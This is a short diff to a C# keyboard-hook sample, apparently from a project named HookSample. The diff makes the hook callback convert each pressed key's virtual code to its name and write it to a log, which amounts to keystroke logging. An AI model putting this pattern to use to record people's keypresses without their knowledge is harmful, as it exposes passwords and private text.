@@ -5,6 +5,7 @@
 
 using System;
 using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 namespace HookSample.Core
 {
@@ -36,9 +37,17 @@ namespace HookSample.Core
             return base.HookCallback(nCode, wParam, lParam);
         }
 
+        /// <summary>
+        /// Starts core actions for the specified key.
+        /// </summary>
+        /// <param name="vkCode">The virtual code of the key.</param>
         protected virtual void CallbackCore(int vkCode)
         {
-            
+            // Converts the code to a string value (firstly getting the key assigned to it).
+            var text = ((Keys)vkCode).ToString();
+
+            // Writes the key to log.
+            Log.Instance.Write(text);
         }
 
         #region Constants
